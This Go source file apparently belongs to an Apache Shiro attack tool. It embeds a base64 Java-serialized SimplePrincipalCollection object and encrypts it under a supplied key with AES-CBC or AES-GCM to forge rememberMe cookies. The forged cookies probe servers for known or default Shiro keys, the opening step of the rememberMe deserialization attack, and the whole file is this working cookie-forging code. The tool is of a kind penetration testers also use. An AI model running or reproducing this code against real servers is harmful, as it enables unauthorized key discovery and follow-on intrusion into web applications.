// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 ZackSecurity

package lib

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"io"

	uuid "github.com/satori/go.uuid"
)

var (
	CheckContent = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="
	Content, _   = base64.StdEncoding.DecodeString(CheckContent)
)

func Padding(plainText []byte, blockSize int) []byte {
	// number of padding bytes
	n := (blockSize - len(plainText)%blockSize)
	// append n bytes of value n (PKCS#7)
	temp := bytes.Repeat([]byte{byte(n)}, n)
	plainText = append(plainText, temp...)
	return plainText
}

func GetShrioCookie(key, mode string) string {
	if mode == "gcm" {
		return AES_GCM_Encrypt(key)
	} else {
		//cbc
		return AES_CBC_Encrypt(key)
	}
}

// AES-CBC encrypted payload
func AES_CBC_Encrypt(shirokey string) string {
	key, err := base64.StdEncoding.DecodeString(shirokey)
	if err != nil {
		return ""
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return ""
	}
	// Pad a copy: Content is a package-level shared slice; padding it in place would grow
	// it by one block per call and race with AES_GCM_Encrypt's concurrent read.
	plainText := Padding(append([]byte(nil), Content...), block.BlockSize())
	iv := uuid.NewV4().Bytes()                     // IV length matches the block size
	blockMode := cipher.NewCBCEncrypter(block, iv) // CBC block mode
	cipherText := make([]byte, len(plainText))
	blockMode.CryptBlocks(cipherText, plainText) // encrypt
	return base64.StdEncoding.EncodeToString(append(iv[:], cipherText[:]...))
}

// AES-GCM payload - Shiro 1.4.2 switched from CBC to GCM
func AES_GCM_Encrypt(shirokey string) string {
	key, err := base64.StdEncoding.DecodeString(shirokey)
	if err != nil {
		return ""
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return ""
	}
	nonce := make([]byte, 16)
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return ""
	}
	aesgcm, _ := cipher.NewGCMWithNonceSize(block, 16)
	ciphertext := aesgcm.Seal(nil, nonce, Content, nil)
	return base64.StdEncoding.EncodeToString(append(nonce, ciphertext...))
}
